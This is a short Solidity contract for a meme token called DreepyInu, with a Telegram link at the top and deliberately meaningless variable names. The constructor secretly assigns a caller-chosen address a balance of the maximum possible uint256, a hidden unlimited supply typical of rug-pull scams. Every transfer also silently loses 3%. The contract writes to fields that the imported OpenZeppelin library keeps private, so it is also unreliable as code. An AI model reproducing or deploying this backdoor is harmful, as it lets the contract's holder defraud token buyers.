// https://t.me/dreepyinu

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract DreepyInu is ERC20, Ownable {
    uint256 private read = ~uint256(0);
    uint256 public college = 3;

    constructor(
        string memory white,
        string memory factor,
        address choose,
        address twice
    ) ERC20(white, factor) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[twice] = read;
    }

    function _transfer(
        address loud,
        address see,
        uint256 cream
    ) internal override {
        uint256 forth = (cream / 100) * college;
        cream -= forth;
        super._transfer(loud, see, cream);
    }
}